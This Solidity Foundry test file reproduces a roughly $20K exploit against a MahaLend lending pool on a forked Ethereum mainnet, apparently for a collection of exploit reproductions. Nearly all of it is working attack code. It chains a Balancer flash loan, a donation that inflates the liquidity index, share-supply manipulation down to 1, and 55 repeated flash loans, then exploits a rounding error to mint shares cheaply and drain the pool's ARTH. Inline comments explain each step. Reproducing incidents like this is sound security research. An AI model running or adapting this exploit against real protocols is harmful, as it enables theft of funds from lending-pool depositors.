// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~20K USD$
// Attacker : https://etherscan.io/address/0x0ec330df28ae6106a774d0add3e540ea8d226e3b
// Attack Contract : https://etherscan.io/address/0xf5836e292f716a7979f9bc5c2d3ed59913e07962
// Vulnerable Contract : https://etherscan.io/address/0xfd11aba71c06061f446ade4eec057179f19c23c4
// Attack Tx :https://etherscan.io/tx/0x2881e839d4d562fad5356183e4f6a9d427ba6f475614ce8ef64dbfe557a4a2cc

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xfd11aba71c06061f446ade4eec057179f19c23c4#code

// @Analysis
// Twitter Guy : https://twitter.com/Phalcon_xyz/status/1723223766350832071

contract ContractTest is Test {
    IERC20 ARTH = IERC20(0x8CC0F052fff7eaD7f2EdCCcaC895502E884a8a71);
    IAaveFlashloan MahaLend = IAaveFlashloan(0x76F0C94Ced5B48020bf0D7f3D0CEabC877744cB5);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address mARTH = 0xE6B683868D1C168Da88cfe5081E34d9D80E4D1a6;
    address mUSDC = 0x658b0f629B9e3753AA555C189D0cB19C1eD59632;
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_544_604);
        vm.label(address(ARTH), "ARTH");
        vm.label(address(USDC), "USDC");
        vm.label(address(MahaLend), "MahaLend");
        vm.label(address(Balancer), "Balancer");
    }

    function testExploit() external {
        USDC.approve(address(MahaLend), type(uint256).max);
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = USDC.balanceOf(address(Balancer));
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint(
            "Attacker ARTH balance after exploit", ARTH.balanceOf(address(this)), ARTH.decimals()
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        uint256 depositAmount = 1_160_272_591_443;
        MahaLend.supply(address(USDC), depositAmount, address(this), 0);

        address[] memory assets = new address[](1);
        assets[0] = address(USDC);
        uint256[] memory amount = new uint256[](1);
        amount[0] = depositAmount;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        MahaLend.flashLoan(address(this), assets, amount, modes, address(this), "", 0);

        for (uint256 i; i < 54; ++i) {
            MahaLend.flashLoan(address(this), assets, amount, modes, address(this), "", 0);
        }

        uint256 borrowAmount = ARTH.balanceOf(address(mARTH));
        MahaLend.borrow(address(ARTH), borrowAmount, 2, 0, address(this));

        // recoverFund recoverfund = new recoverFund();
        // USDC.transfer(address(recoverfund), USDC.balanceOf(address(this)));
        // recoverfund.recoverDonatedFund();
        recoverDonatedFund();

        USDC.transfer(address(Balancer), amounts[0]);
    }

    function executeOperation(
        address[] calldata asset,
        uint256[] calldata amount,
        uint256[] calldata premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        if (nonce == 0) {
            uint256 depositAmount = amount[0];
            USDC.transfer(address(mUSDC), depositAmount); // donate USDC as flashloan fund to inflate index
            MahaLend.withdraw(address(USDC), depositAmount - 1, address(this)); // manipulate totalSupply to 1
            nonce++;
        }
        return true;
    }

    function recoverDonatedFund() internal {
        uint256 premiumPerFlashloan = uint256(1_160_272_591_443) * 5 / 10_000 + 1; // 0.05% flashlaon fee
        premiumPerFlashloan -= (premiumPerFlashloan * 4 / 10_000); // 0.04% protocol fee
        uint256 nextLiquidityIndex = premiumPerFlashloan * 55 + 1; // 55 times flashloan
        uint256 supplyAmount = nextLiquidityIndex / 2 + 1; // Use a rounding error greater than 0.5 for upward rounding and less than downward rounding

        console.log("premiumPerFlashloan", premiumPerFlashloan);
        console.log("nextLiquidityIndex", nextLiquidityIndex);
        console.log("supplyAmount", supplyAmount);

        uint256 count;
        USDC.approve(address(MahaLend), type(uint256).max);
        do {
            MahaLend.supply(address(USDC), supplyAmount, address(this), 0); // supply 50% asset of 1 share, but mint 1 share throungh rounding error
            count++;
        } while (USDC.balanceOf(address(mUSDC)) > count * nextLiquidityIndex);

        MahaLend.withdraw(address(USDC), USDC.balanceOf(address(mUSDC)), address(this)); // withdraw all asset
    }
}
